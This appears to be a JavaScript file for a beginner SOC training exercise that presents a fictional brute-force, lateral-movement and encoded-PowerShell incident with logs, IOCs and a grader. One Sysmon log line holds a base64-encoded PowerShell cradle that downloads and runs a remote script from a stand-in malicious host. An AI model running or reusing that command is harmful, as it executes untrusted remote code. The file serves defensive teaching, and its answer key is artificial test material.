/* SecurityOps 101 — Incident Response Workbench
 * One end-to-end SOC case for beginners. */

(function () {
  "use strict";

  const caseData = {
    id: "IR-2026-10-30-001",
    title: "SMB Lateral Movement + Encoded PowerShell",
    severity: "High",
    summary:
      "EDR raised an alert on WORKSTATION-42: multiple failed Windows logons from 10.0.0.55 were followed by a successful logon, then an encoded PowerShell command and an outbound HTTPS connection to a rare domain.",
    logs: [
      {
        source: "Windows Security",
        raw: `LogName=Security\nEventID=4625\nTimeCreated=2026-10-30 02:14:33Z\nAccountName=administrator\nSourceAddress=10.0.0.55\nWorkstationName=DESKTOP-EVIL\nStatus=0xC000006D (bad username or password)\nDetails=10 failed attempts in 45 seconds`,
      },
      {
        source: "Windows Security",
        raw: `LogName=Security\nEventID=4624\nTimeCreated=2026-10-30 02:15:19Z\nAccountName=administrator\nSourceAddress=10.0.0.55\nLogonType=3 (network)\nProcessName=svchost.exe\nAuthenticationPackage=NTLM`,
      },
      {
        source: "Sysmon",
        raw: `LogName=Microsoft-Windows-Sysmon/Operational\nEventID=1\nTimeCreated=2026-10-30 02:15:24Z\nImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine=powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAeAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==\nUser=NT AUTHORITY\\SYSTEM`,
      },
      {
        source: "Firewall",
        raw: `LogName=Firewall\nTimeCreated=2026-10-30 02:15:27Z\nAction=allowed\nSourceIP=10.0.0.42\nDestinationIP=185.220.101.44\nDestinationPort=443\nDestinationDomain=evil-c2.com\nRuleName=default-out-https`,
      },
    ],
    iocs: [
      { value: "10.0.0.55", type: "ip", verdict: "malicious", note: "Source of brute-force attempts; not in corporate asset inventory." },
      { value: "evil-c2.com", type: "domain", verdict: "malicious", note: "Recently registered domain associated with malware C2 infrastructure." },
      { value: "185.220.101.44", type: "ip", verdict: "malicious", note: "IP hosting evil-c2.com; seen in multiple threat reports." },
      { value: "a3b8c9d2e1f4056789012345678901234567890abcdef1234567890abcdef12345", type: "hash", verdict: "unknown", note: "Hash of the dropped shell.ps1. No reputation data yet — escalate for malware analysis." },
    ],
    expected: {
      verdict: "escalate",
      techniques: ["T1110", "T1021.002", "T1059.001"],
      rationaleKeys: ["brute force", "lateral movement", "encoded powershell", "c2", "evil-c2", "10.0.0.55"],
    },
  };

  const mitreTechniques = [
    { id: "T1110", name: "Brute Force" },
    { id: "T1021.002", name: "Remote Services: SMB/Windows Admin Shares" },
    { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell" },
    { id: "T1071.001", name: "Application Layer Protocol: Web Protocols" },
    { id: "T1003.001", name: "OS Credential Dumping: LSASS Memory" },
    { id: "T1566.001", name: "Phishing: Spearphishing Attachment" },
    { id: "T1547.001", name: "Boot or Logon Autostart Execution: Registry Run Keys" },
    { id: "T1041", name: "Exfiltration Over C2 Channel" },
  ];

  function renderCase() {
    const section = document.getElementById("caseFile");
    if (!section) return;

    // Build MITRE select options
    const mitreSelect = document.getElementById("caseMitre");
    if (mitreSelect) {
      mitreTechniques.forEach(function (t) {
        const opt = document.createElement("option");
        opt.value = t.id;
        opt.textContent = `${t.id} — ${t.name}`;
        mitreSelect.appendChild(opt);
      });
    }

    // Render logs
    const logsEl = document.getElementById("caseLogs");
    if (logsEl) {
      caseData.logs.forEach(function (log, idx) {
        const block = document.createElement("div");
        block.className = "log-block";
        block.innerHTML = `<strong>Source:</strong> ${log.source}<br><strong>Event:</strong><br>${escapeHtml(log.raw)}`;
        logsEl.appendChild(block);
      });
    }

    // Render IOCs
    const iocsEl = document.getElementById("caseIocs");
    if (iocsEl) {
      caseData.iocs.forEach(function (ioc) {
        const chip = document.createElement("button");
        chip.className = "ioc-chip";
        chip.textContent = `${ioc.type.toUpperCase()}: ${ioc.value}`;
        chip.dataset.value = ioc.value;
        chip.addEventListener("click", function () {
          showIocLookup(ioc);
        });
        iocsEl.appendChild(chip);
      });
    }

    // Decode PowerShell hint
    const decodeBtn = document.getElementById("caseDecode");
    const decodeOut = document.getElementById("caseDecodeOutput");
    if (decodeBtn && decodeOut) {
      decodeBtn.addEventListener("click", function () {
        decodeOut.hidden = false;
      });
    }
  }

  function showIocLookup(ioc) {
    const out = document.getElementById("caseIocOutput");
    const verdict = document.getElementById("caseIocVerdict");
    const details = document.getElementById("caseIocDetails");
    if (!out || !verdict || !details) return;

    out.hidden = false;
    verdict.className = "verdict " + ioc.verdict;
    verdict.textContent = ioc.verdict.toUpperCase();
    details.innerHTML = `<strong>${ioc.type.toUpperCase()}:</strong> ${escapeHtml(ioc.value)}<br><strong>Note:</strong> ${escapeHtml(ioc.note)}`;
  }

  function escapeHtml(text) {
    const div = document.createElement("div");
    div.textContent = text;
    return div.innerHTML;
  }

  function evaluateCase() {
    const mitreSelect = document.getElementById("caseMitre");
    const verdictSelect = document.getElementById("caseVerdict");
    const rationale = document.getElementById("caseRationale");
    const feedback = document.getElementById("caseFeedback");

    if (!mitreSelect || !verdictSelect || !rationale || !feedback) return;

    const selectedMitre = mitreSelect.value;
    const selectedVerdict = verdictSelect.value;
    const userText = rationale.value.toLowerCase();

    const expected = caseData.expected;
    const mitreOk = expected.techniques.includes(selectedMitre);
    const verdictOk = selectedVerdict === expected.verdict;

    const rationaleHits = expected.rationaleKeys.filter(function (k) {
      return userText.includes(k);
    });

    let html = "";
    if (verdictOk && mitreOk && rationaleHits.length >= 2) {
      html += "🎉 Excellent triage!\n\n";
      feedback.className = "feedback ok";
    } else {
      html += "📋 Review your findings.\n\n";
      feedback.className = "feedback bad";
    }

    html += `Verdict: ${verdictOk ? "✓ correct" : "✗ should be " + expected.verdict}\n`;
    html += `MITRE technique: ${mitreOk ? "✓ relevant" : "✗ consider one of: " + expected.techniques.join(", ")}\n`;
    html += `Rationale: ${rationaleHits.length >= 2 ? "✓ covers key points" : "✗ mention brute force, lateral movement, encoded PowerShell, or C2 communication"}\n\n`;

    html += "Why escalate:\n";
    html += "• Multiple 4625 events from an unknown IP indicate brute-force activity (T1110).\n";
    html += "• A successful 4624 network logon from the same IP suggests the attacker got credentials and moved laterally (T1021.002).\n";
    html += "• Encoded PowerShell downloading a remote script is a classic payload delivery pattern (T1059.001).\n";
    html += "• Outbound HTTPS to evil-c2.com confirms command-and-control communication.\n\n";
    html += "Next steps for L2/IR: isolate WORKSTATION-42, reset the compromised account, block 10.0.0.55 and evil-c2.com at the perimeter, and hunt for the same IOCs across the fleet.";

    feedback.textContent = html;
    feedback.hidden = false;
  }

  document.addEventListener("DOMContentLoaded", function () {
    renderCase();
    const submitBtn = document.getElementById("caseSubmit");
    if (submitBtn) {
      submitBtn.addEventListener("click", evaluateCase);
    }
  });
})();
